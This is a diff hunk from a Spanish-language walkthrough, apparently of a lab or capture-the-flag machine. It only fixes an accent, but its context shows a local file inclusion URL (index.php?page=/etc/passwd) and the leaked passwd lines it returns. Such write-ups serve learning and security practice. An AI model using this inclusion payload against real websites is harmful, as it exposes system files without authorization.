@@ -142,7 +142,7 @@ bueno parece ser que por ahí van los tiros
 ```bash
 http://172.17.0.2/index.php?page=/etc/passwd
 ```
-inserto eso en el buscador y tengo acceso al /etc/passwd (lo leo en el codigo fuente que está mas ordenadito)
+inserto eso en el buscador y tengo acceso al /etc/passwd (lo leo en el codigo fuente que está más ordenadito)
 ```bash
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
